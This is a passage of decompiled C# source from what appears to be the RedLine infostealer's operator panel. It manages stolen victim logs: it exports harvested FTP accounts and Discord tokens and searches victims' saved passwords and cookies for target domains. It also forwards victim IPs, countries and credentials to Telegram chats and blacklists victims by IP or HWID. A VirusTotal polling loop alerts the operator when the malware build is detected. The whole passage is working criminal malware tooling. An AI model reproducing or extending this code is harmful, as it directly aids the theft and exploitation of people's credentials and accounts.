		((Control)checkConnectionBtn).Text = "Checking";
		string text = ((AnimaTextBox)this.m_a6).Text;
		if (!string.IsNullOrWhiteSpace(text))
		{
			string[] ips = text.Split('|');
			string[] array = ips;
			foreach (string text2 in array)
			{
				if (!IPAddress.TryParse(text2, out var _) && !new Regex("^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\\.)+[A-Za-z]{2,6}$").IsMatch(text2))
				{
					MessageBox.Show(this, "'" + text2 + "' is invalid address");
					((Control)checkConnectionBtn).Text = "Check connection";
					((MetroSetButton)checkConnectionBtn).Enabled = true;
					((MetroSetButton)this.m_a8).Enabled = true;
					return;
				}
			}
			await Task.Factory.StartNew(delegate
			{
			});
			((Control)checkConnectionBtn).Text = "Check connection";
			((MetroSetButton)checkConnectionBtn).Enabled = true;
			((MetroSetButton)this.m_a8).Enabled = true;
		}
		else
		{
			MessageBox.Show(this, "Enter a server ip");
			((Control)checkConnectionBtn).Text = "Check connection";
			((MetroSetButton)checkConnectionBtn).Enabled = true;
			((MetroSetButton)this.m_a8).Enabled = true;
		}
	}

	private async void toolStripMenuItem5_Click(object sender, object e)
	{
		try
		{
			if (((DataGridView)guestFilesDgv).SelectedRows.Count <= 0)
			{
				return;
			}
			List<int> list = new List<int>();
			foreach (DataGridViewRow selectedRow in ((DataGridView)guestFilesDgv).SelectedRows)
			{
				list.Add((int)selectedRow.Cells[0].Value);
			}
			foreach (int selectedItem in list)
			{
				await Task.Factory.StartNew(delegate
				{
					try
					{
						Invoke((MethodInvoker)delegate
						{
							LazyLoader<GuestFilesDb>.Instance.Delete((GuestFile x) => x.ID == selectedItem);
						});
					}
					catch
					{
					}
				});
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private void blackListCms_4_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((DataGridView)guestFilesDgv).SelectedRows.Count == 0;
	}

	private async void createDirectFileBtn_Click(object sender, object e)
	{
		try
		{
			object CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass115_0();
			((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0)._003C_003E4__this = this;
			((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0).filePath = string.Empty;
			await Task.Factory.StartNew(delegate
			{
				try
				{
					_003C_003Ec__DisplayClass115_0 _003C_003Ec__DisplayClass115_ = (_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0;
					OpenFileDialog ofd = new OpenFileDialog();
					try
					{
						ofd.Filter = "All files (*.*)|*.*";
						ofd.CheckPathExists = true;
						ofd.InitialDirectory = Directory.GetCurrentDirectory();
						ofd.RestoreDirectory = true;
						ofd.Multiselect = false;
						((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0)._003C_003E4__this.Invoke((MethodInvoker)delegate
						{
							if (ofd.ShowDialog(_003C_003Ec__DisplayClass115_._003C_003E4__this) == DialogResult.OK)
							{
								_003C_003Ec__DisplayClass115_.filePath = ofd.FileName;
							}
						});
					}
					finally
					{
						if (ofd != null)
						{
							((IDisposable)ofd).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
					MessageBox.Show(((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0)._003C_003E4__this, "Error: " + ex2.Message);
				}
			});
			((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0).fileInfo = new FileInfo(((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0).filePath);
			if (((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0).fileInfo.Length <= 2097152L)
			{
				if (LazyLoader<GuestFilesDb>.Instance.DbInstance.ToArray().Any((GuestFile x) => x.Filename == ((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0).fileInfo.Name))
				{
					MessageBox.Show(this, "Link with this filename already exist in database");
					return;
				}
				string text = Path.Combine(Directory.CreateDirectory(Path.Combine(Directory.GetCurrentDirectory(), "GuestFilesHost")).FullName, ((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0).fileInfo.Name);
				if (!System.IO.File.Exists(text))
				{
					System.IO.File.Copy(((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0).filePath, text);
				}
				GuestFile guestFile = new GuestFile
				{
					ChangeMd5 = ((MetroSetCheckBox)changeMd5Cb).Checked,
					Filename = ((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals0).fileInfo.Name
				};
				lock (LazyLoader<GuestFilesDb>.Instance.DataBaseLock)
				{
					if (LazyLoader<GuestFilesDb>.Instance.DbInstance.Count != 0)
					{
						guestFile.ID = LazyLoader<GuestFilesDb>.Instance.DbInstance[LazyLoader<GuestFilesDb>.Instance.DbInstance.Count - 1].ID + 1;
					}
					else
					{
						guestFile.ID = 1;
					}
					LazyLoader<GuestFilesDb>.Instance.Save(guestFile);
					Invoke((MethodInvoker)delegate
					{
						LazyLoader<GuestFilesDb>.Instance.DbInstance.Add(guestFile);
					});
				}
			}
			else
			{
				MessageBox.Show(this, "Max size of file is 2 MB");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private void guestFilesDgv_DoubleClick(object sender, object e)
	{
		if (((DataGridView)guestFilesDgv).SelectedRows.Count > 0)
		{
			Process.Start($"http://{((ServiceSettings)object_3).GuestAdress}:{((ServiceSettings)object_3).GuestPort}/{((DataGridView)guestFilesDgv).SelectedRows[0].Cells[1].Value}");
		}
	}

	private void showToolStripMenuItem_Click(object sender, object e)
	{
		try
		{
			Show();
			((NotifyIcon)object_15).Visible = false;
		}
		catch
		{
		}
	}

	private void exitToolStripMenuItem_Click(object sender, object e)
	{
		Environment.Exit(0);
	}

	private async void lockBtn_Click(object sender, object e)
	{
		string password = Interaction.InputBox("Enter a password:", "RedLine Locker", null);
		if (string.IsNullOrWhiteSpace(password))
		{
			return;
		}
		await Task.Factory.StartNew(delegate
		{
			Hide();
			while (new LockFrm(password).ShowDialog(this) != DialogResult.OK)
			{
			}
			Show();
		});
	}

	private async void blockIptoolStripMenuItem_Click(object sender, object e)
	{
		try
		{
			if (((DataGridView)logsListView).SelectedRows.Count <= 0)
			{
				return;
			}
			object enumerator = ((DataGridView)logsListView).SelectedRows.GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)((IEnumerator)enumerator).Current;
					int selectedItem = (int)dataGridViewRow.Cells[0].Value;
					await Task.Factory.StartNew(delegate
					{
						try
						{
							UserLog userLog = LazyLoader<UserLogsDb>.Instance.Find((UserLog x) => x.ID == selectedItem);
							Invoke((MethodInvoker)delegate
							{
								((ListBox)blackListIPsLb).Items.Add(userLog.IP);
							});
							lock (settingsLock)
							{
								RemoteClientSettings.BlackListedIPS.Add(userLog.IP);
							}
							userLog = default(UserLog);
						}
						catch
						{
						}
					});
					lock (settingsLock)
					{
						RemoteClientSettings.SaveSettings();
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			MessageBox.Show(this, "Successfully blocked");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private void editToolStripMenuItem_Click(object sender, object e)
	{
		try
		{
			string text = Interaction.InputBox("Edit value:", "RedLine Edit", ((ListBox)getFilesSettingsLb).Items[((ListControl)getFilesSettingsLb).SelectedIndex].ToString());
			if (!string.IsNullOrWhiteSpace(text) && ((ListBox)getFilesSettingsLb).Items[((ListControl)getFilesSettingsLb).SelectedIndex].ToString() != text)
			{
				((ListBox)getFilesSettingsLb).Items[((ListControl)getFilesSettingsLb).SelectedIndex] = text;
				MessageBox.Show(this, "Successfully");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private void toolStripMenuItem7_Click(object sender, object e)
	{
		try
		{
			string text = Interaction.InputBox("Edit value:", "RedLine Edit", ((ListBox)domainDetectorLb).Items[((ListControl)domainDetectorLb).SelectedIndex].ToString());
			if (!string.IsNullOrWhiteSpace(text) && ((ListBox)domainDetectorLb).Items[((ListControl)domainDetectorLb).SelectedIndex].ToString() != text)
			{
				((ListBox)domainDetectorLb).Items[((ListControl)domainDetectorLb).SelectedIndex] = text;
				MessageBox.Show(this, "Successfully");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private void nextPageBtn_Click(object sender, object e)
	{
		try
		{
			int num = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage + 1;
			if (num >= 0 && num < LazyLoader<UserLogsDb>.Instance.PageController.PagesCount)
			{
				LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = num;
			}
		}
		catch
		{
		}
	}

	private void goToPageBtn_Click(object sender, object e)
	{
		try
		{
			int result;
			if (string.IsNullOrWhiteSpace(((AnimaTextBox)pageNumberTb).Text))
			{
				MessageBox.Show(this, "Enter a number of page");
			}
			else if (int.TryParse(((AnimaTextBox)pageNumberTb).Text, out result))
			{
				if (result < 0)
				{
					MessageBox.Show("The number must be positive");
				}
				else if (result <= LazyLoader<UserLogsDb>.Instance.PageController.Pages.Count)
				{
					LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = result - 1;
				}
				else
				{
					MessageBox.Show("The number must be equal to or less than " + LazyLoader<UserLogsDb>.Instance.PageController.Pages.Count);
				}
			}
		}
		catch
		{
		}
	}

	private void backPageBtn_Click(object sender, object e)
	{
		try
		{
			int num = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage - 1;
			if (num >= 0 && num < LazyLoader<UserLogsDb>.Instance.PageController.PagesCount)
			{
				LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = num;
			}
		}
		catch
		{
		}
	}

	private void chooseAutosaveDirectory_Click(object sender, object e)
	{
		FolderSelectDialog folderSelectDialog = new FolderSelectDialog
		{
			InitialDirectory = Directory.GetCurrentDirectory(),
			Title = "Choose directory to save logs"
		};
		if (folderSelectDialog.Show(base.Handle))
		{
			((AnimaTextBox)autosaveDirTb).Text = folderSelectDialog.FileName;
		}
	}

	private async void removeEmptyLogsBtn_Click(object sender, object e)
	{
		((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
		((MetroSetButton)singleSort).Enabled = false;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = false;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = false;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = false;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
				LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
				UserLog[] source;
				lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
				{
					source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
				}
				BindingList<UserLog> bindingList = new BindingList<UserLog> { source.Where((UserLog x) => x.Creds == "0|0|0|0") };
				foreach (UserLog newLog in bindingList)
				{
					LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
				}
				LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
				LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
				LazyLoader<UserLogsDb>.Instance.PageController.Clear();
				LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
				LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
				MessageBox.Show(this, $"Removed {bindingList.Count} empty logs");
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
		((MetroSetButton)singleSort).Enabled = true;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = true;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = true;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = true;
		((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
	}

	private async void removeCheckedLogsBtn_Click(object sender, object e)
	{
		((MetroSetButton)singleSort).Enabled = false;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = false;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = false;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = false;
		((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
				LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
				UserLog[] source;
				lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
				{
					source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
				}
				BindingList<UserLog> bindingList = new BindingList<UserLog> { source.Where((UserLog x) => x.Checked) };
				foreach (UserLog newLog in bindingList)
				{
					LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
				}
				LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
				LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
				LazyLoader<UserLogsDb>.Instance.PageController.Clear();
				LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
				LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
				MessageBox.Show(this, $"Removed {bindingList.Count} checked logs");
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
		((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
		((MetroSetButton)singleSort).Enabled = true;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = true;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = true;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = true;
	}

	private async void showDomainDetects_Click(object sender, object e)
	{
		DataGridViewRow dataGridViewRow = ((DataGridView)logsListView).SelectedRows[0];
		int selectedItem = (int)dataGridViewRow.Cells[0].Value;
		((DataGridView)logsListView).GetCellDisplayRectangle(9, dataGridViewRow.Index, cutOverflow: true);
		await Task.Factory.StartNew(delegate
		{
			try
			{
				UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
				List<string> list = new List<string>();
				lock (settingsLock)
				{
					list = ((RemoteClientSettings.DDPatterns == null) ? new List<string>() : RemoteClientSettings.DDPatterns.Cast<string>().ToList());
				}
				List<string> list2 = new List<string>();
				List<string> list3 = new List<string>();
				string empty = string.Empty;
				foreach (string item in list)
				{
					try
					{
						string[] links = item.Split('=')[1].Split('|');
						foreach (string item2 in userLog.PasswordContains(links).IsNull(new List<string>()))
						{
							list2.Add("[" + item.Split('=')[0] + "] " + item2);
						}
						foreach (string item3 in userLog.CookiesContains(links).IsNull(new List<string>()))
						{
							list3.Add("[" + item.Split('=')[0] + "] " + item3);
						}
					}
					catch
					{
					}
				}
				list2 = (from x in list2.Distinct()
					where !string.IsNullOrWhiteSpace(x)
					select x).ToList();
				list3 = (from x in list3.Distinct()
					where !string.IsNullOrWhiteSpace(x)
					select x).ToList();
				if (list2.Count() == 0)
				{
					empty = empty + "PDD: NOT FOUND" + Environment.NewLine + Environment.NewLine;
				}
				else
				{
					empty = empty + "PDD: " + Environment.NewLine;
					foreach (string item4 in list2)
					{
						empty = empty + item4 + ", ";
					}
					empty = empty.TrimEnd(',', ' ') + Environment.NewLine;
				}
				if (list3.Count() != 0)
				{
					empty = empty + "CDD: " + Environment.NewLine;
					foreach (string item5 in list3)
					{
						empty = empty + item5 + ", ";
					}
					empty = empty.TrimEnd(',', ' ') + Environment.NewLine;
				}
				else
				{
					empty = empty + "CDD: NOT FOUND" + Environment.NewLine + Environment.NewLine;
				}
				userLog = default(UserLog);
				MessageBox.Show(this, empty, "Domain Detect Viewer");
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void saveFtpAccountsBtn_Click(object sender, object e)
	{
		((MetroSetButton)singleSort).Enabled = false;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = false;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = false;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = false;
		((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
		SingleSearchParams singleSearch = new SingleSearchParams
		{
			SaveFtps = true,
			LogFrom = ((DateTimePicker)logDateFromDTP).Value,
			LogTo = ((DateTimePicker)logDateToDTP).Value
		};
		await Task.Factory.StartNew(delegate
		{
			try
			{
				FolderSelectDialog folderSelectDialog = new FolderSelectDialog
				{
					InitialDirectory = Directory.GetCurrentDirectory(),
					Title = "Choose directory to save ftps"
				};
				if (folderSelectDialog.Show(base.Handle))
				{
					LogSorter logSorter = new LogSorter(folderSelectDialog.FileName, singleSearch);
					logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate(int index, int total)
					{
						Invoke((MethodInvoker)delegate
						{
							((Control)singleStatusLbl).Text = $"{index} / {total}";
						});
					});
					logSorter.Sort();
					Invoke((MethodInvoker)delegate
					{
						((Control)singleStatusLbl).Text = "Waiting";
					});
					MessageBox.Show(this, "Success");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
		((MetroSetButton)singleSort).Enabled = true;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = true;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = true;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = true;
		((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
	}

	private async void importHWIDs_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				OpenFileDialog ofd = new OpenFileDialog();
				try
				{
					ofd.Filter = "Txt files (*.txt)|*.txt";
					ofd.CheckPathExists = true;
					ofd.InitialDirectory = Directory.GetCurrentDirectory();
					ofd.RestoreDirectory = true;
					ofd.Multiselect = false;
					Invoke((MethodInvoker)delegate
					{
						if (ofd.ShowDialog(this) == DialogResult.OK)
						{
							string[] array = System.IO.File.ReadAllLines(ofd.FileName);
							foreach (string item in array)
							{
								((ListBox)blackListHWIDsLb).Items.Add(item);
							}
						}
					});
				}
				finally
				{
					if (ofd != null)
					{
						((IDisposable)ofd).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private void addBlackHwidBtn_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)blackHwidTb).Text))
		{
			MessageBox.Show(this, "Please enter a HWID");
			return;
		}
		((ListBox)blackListHWIDsLb).Items.Add(((AnimaTextBox)blackHwidTb).Text);
		((AnimaTextBox)blackHwidTb).Text = string.Empty;
	}

	private async void blockHwidtoolStripMenuItem8_Click(object sender, object e)
	{
		try
		{
			if (((DataGridView)logsListView).SelectedRows.Count <= 0)
			{
				return;
			}
			object enumerator = ((DataGridView)logsListView).SelectedRows.GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)((IEnumerator)enumerator).Current;
					int selectedItem = (int)dataGridViewRow.Cells[0].Value;
					await Task.Factory.StartNew(delegate
					{
						try
						{
							UserLog userLog = LazyLoader<UserLogsDb>.Instance.Find((UserLog x) => x.ID == selectedItem);
							Invoke((MethodInvoker)delegate
							{
								((ListBox)blackListHWIDsLb).Items.Add(userLog.HWID);
							});
							lock (settingsLock)
							{
								RemoteClientSettings.BlacklistedHWID.Add(userLog.HWID);
							}
							userLog = default(UserLog);
						}
						catch
						{
						}
					});
					lock (settingsLock)
					{
						RemoteClientSettings.SaveSettings();
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			MessageBox.Show(this, "Successfully blocked");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	public void RunVirustotalScan(string filename, string apikey)
	{
		while (ScanVT)
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.Headers.Add("x-apikey", apikey);
				webClient.DownloadString(" https://www.virustotal.com/api/v3/files/" + Md5Helper.GetSha256(System.IO.File.ReadAllBytes(filename)));
				MessageBox.Show(this, "WARNING. File detected on VIRUSTOTAL!!");
			}
			catch (Exception ex2)
			{
				Exception ex3 = ex2;
				Exception ex = ex3;
				Invoke((MethodInvoker)delegate
				{
					AnimaTextBox val = (AnimaTextBox)virusTotalTextbox;
					val.Text = val.Text + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + " | " + ex.Message + Environment.NewLine;
				});
			}
			DateTime dateTime = DateTime.Now.AddMinutes(15.0);
			while (DateTime.Now < dateTime && ScanVT)
			{
				Thread.Sleep(100);
			}
		}
		Invoke((MethodInvoker)delegate
		{
			object obj = virusTotalTextbox;
			((AnimaTextBox)obj).Text = ((AnimaTextBox)obj).Text + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + " | Stopped" + Environment.NewLine;
			((MetroSetButton)metroSetButton3).Enabled = true;
			((Control)metroSetButton3).Text = "Start";
		});
	}

	private void openVirusTotalFile_Click(object sender, object e)
	{
		((AnimaTextBox)virustotalFile).Text = string.Empty;
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Multiselect = false;
		openFileDialog.RestoreDirectory = true;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			((AnimaTextBox)virustotalFile).Text = openFileDialog.FileName;
		}
	}

	private void metroSetButton3_Click(object sender, object e)
	{
		if (((Control)metroSetButton3).Text == "Start")
		{
			if (!string.IsNullOrWhiteSpace(((AnimaTextBox)virustotalFile).Text) && !string.IsNullOrWhiteSpace(((AnimaTextBox)virusTotalKey).Text))
			{
				ScanVT = true;
				((Control)metroSetButton3).Text = "Stop";
				string apikey = ((AnimaTextBox)virusTotalKey).Text;
				string file = ((AnimaTextBox)virustotalFile).Text;
				Task.Factory.StartNew(delegate
				{
					RunVirustotalScan(file, apikey);
				});
			}
			else
			{
				MessageBox.Show(this, "Fill the data");
			}
		}
		else
		{
			((Control)metroSetButton3).Text = "Stopping";
			((MetroSetButton)metroSetButton3).Enabled = false;
			ScanVT = false;
		}
	}

	private void blackListCms_6_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((ListBox)blackListHWIDsLb).SelectedItems.Count == 0;
	}

	private void toolStripMenuItem8_Click(object sender, object e)
	{
		((ListBox)blackListHWIDsLb).Items.RemoveAt(((ListControl)blackListHWIDsLb).SelectedIndex);
	}

	private async void proSignButton_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
		});
	}

	private void logsListView_SelectionChanged(object sender, object e)
	{
		try
		{
			int count = ((DataGridView)logsListView).SelectedRows?.Count ?? 0;
			Invoke((MethodInvoker)delegate
			{
				((Control)totalSelectedLogs).Text = count.ToString();
			});
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private void removeRecipientIdBtn_Click(object sender, object e)
	{
		try
		{
			if (((ListBox)recipientsIdsListBox).SelectedItems.Count == 0)
			{
				MessageBox.Show(this, "Select recipient to remove");
				return;
			}
			lock (((TelegramChatsDb)this.m_e).RootLocker)
			{
				((TelegramChatsDb)this.m_e).chatsSettings.RemoveAt(((ListControl)recipientsIdsListBox).SelectedIndex);
				((TelegramChatsDb)this.m_e).SaveSettings();
			}
			UpdateRecipients();
			MessageBox.Show(this, "Successfully removed");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private void configRecipientIdBtn_Click(object sender, object e)
	{
		try
		{
			if (((ListBox)recipientsIdsListBox).SelectedItems.Count == 0)
			{
				MessageBox.Show(this, "Select recipient to configurate");
				return;
			}
			TelegramChatSettings chatSettings = new TelegramChatSettings();
			lock (((TelegramChatsDb)this.m_e).RootLocker)
			{
				chatSettings = ((TelegramChatsDb)this.m_e).chatsSettings[((ListControl)recipientsIdsListBox).SelectedIndex];
			}
			TelegramConfigurator telegramConfigurator = new TelegramConfigurator(chatSettings);
			if (telegramConfigurator.ShowDialog(this) == DialogResult.OK)
			{
				lock (((TelegramChatsDb)this.m_e).RootLocker)
				{
					((TelegramChatsDb)this.m_e).chatsSettings[((ListControl)recipientsIdsListBox).SelectedIndex] = telegramConfigurator.CurrentChatSettings;
					((TelegramChatsDb)this.m_e).SaveSettings();
				}
				MessageBox.Show(this, "Successfully configurated");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private async void saveDiscordTokensBtn_Click(object sender, object e)
	{
		((MetroSetButton)singleSort).Enabled = false;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = false;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = false;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = false;
		((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
		SingleSearchParams singleSearch = new SingleSearchParams
		{
			SaveDisordTokens = true,
			LogFrom = ((DateTimePicker)logDateFromDTP).Value,
			LogTo = ((DateTimePicker)logDateToDTP).Value
		};
		await Task.Factory.StartNew(delegate
		{
			try
			{
				FolderSelectDialog folderSelectDialog = new FolderSelectDialog
				{
					InitialDirectory = Directory.GetCurrentDirectory(),
					Title = "Choose directory to save ftps"
				};
				if (folderSelectDialog.Show(base.Handle))
				{
					LogSorter logSorter = new LogSorter(folderSelectDialog.FileName, singleSearch);
					logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate(int index, int total)
					{
						Invoke((MethodInvoker)delegate
						{
							((Control)singleStatusLbl).Text = $"{index} / {total}";
						});
					});
					logSorter.Sort();
					Invoke((MethodInvoker)delegate
					{
						((Control)singleStatusLbl).Text = "Waiting";
					});
					MessageBox.Show(this, "Success");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
		((MetroSetButton)singleSort).Enabled = true;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = true;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = true;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = true;
		((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
	}

	private async void addRecipientIdBtn_Click(object sender, object e)
	{
		try
		{
			List<string> list = new List<string>();
			string text = Interaction.InputBox("Enter a chat id:", "RedLine Config", string.Empty);
			if (string.IsNullOrWhiteSpace(text))
			{
				return;
			}
			lock (((TelegramChatsDb)this.m_e).RootLocker)
			{
				IEnumerable<string> enumerable = ((TelegramChatsDb)this.m_e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
				List<string> list2;
				if (enumerable != null)
				{
					list2 = enumerable.ToList();
					if (list2 != null)
					{
						goto IL_0093;
					}
				}
				list2 = new List<string>();
				goto IL_0093;
				IL_0093:
				list = list2;
			}
			if (!list.Contains(text))
			{
				lock (((TelegramChatsDb)this.m_e).RootLocker)
				{
					if (CountOfChats() <= ((TelegramChatsDb)this.m_e).chatsSettings.Count)
					{
						MessageBox.Show(this, "Maximum number of chats has been added");
					}
					else
					{
						((TelegramChatsDb)this.m_e).chatsSettings.Add(new TelegramChatSettings
						{
							ChatId = Convert.ToInt64(text),
							MessageFormat = "Номер: {ID}\r\nБилд: {BuildID}\r\nОС: {OS}\r\nIP: {IP}\r\nДанные: {Creds}\r\nСтрана: {Country}",
							SendingMode = SendingMode.NoAttachments,
							SearchParams = new SingleSearchParams
							{
								LogFrom = DateTime.MinValue,
								LogTo = DateTime.MaxValue
							}
						});
						((TelegramChatsDb)this.m_e).SaveSettings();
					}
				}
				UpdateRecipients();
				MessageBox.Show(this, "Successfull added");
			}
			else
			{
				MessageBox.Show(this, "Already exist");
			}
		}
		catch (Exception arg)
		{
			MessageBox.Show(this, $"Error :{arg}");
		}
	}

	private void removeIdBlackListBtn_Click(object sender, object e)
	{
		try
		{
			if (((ListBox)blackListChatIds).SelectedItems.Count == 0)
			{
				MessageBox.Show(this, "Select recipient to remove");
				return;
			}
			((ListBox)blackListChatIds).Items.RemoveAt(((ListControl)blackListChatIds).SelectedIndex);
			if (((ListBox)blackListChatIds).Items.Count > 0)
			{
				System.IO.File.WriteAllLines("blackListChats.ini", ((ListBox)blackListChatIds).Items.Cast<string>().ToArray());
			}
			else if (System.IO.File.Exists("blackListChats.ini"))
			{
				System.IO.File.Delete("blackListChats.ini");
			}
			MessageBox.Show(this, "Successfully removed");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private async void addIdBlackListBtn_Click(object sender, object e)
	{
		try
		{
			List<string> list = new List<string>();
			string newValue = Interaction.InputBox("Enter a chat id:", "RedLine Config", string.Empty);
			if (string.IsNullOrWhiteSpace(newValue))
			{
				return;
			}
			if (((ListBox)blackListChatIds).SelectedItems.Count > 0)
			{
				list.AddRange(((ListBox)blackListChatIds).Items.Cast<string>());
			}
			if (!list.Contains(newValue))
			{
				Invoke((MethodInvoker)delegate
				{
					((ListBox)blackListChatIds).Items.Add(newValue);
				});
				System.IO.File.AppendAllText("blackListChats.ini", newValue + Environment.NewLine);
				MessageBox.Show(this, "Successfull added");
			}
			else
			{
				MessageBox.Show(this, "Already exist");
			}
		}
		catch (Exception arg)
		{
			MessageBox.Show(this, $"Error :{arg}");
		}
	}

	private async void importCountries_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
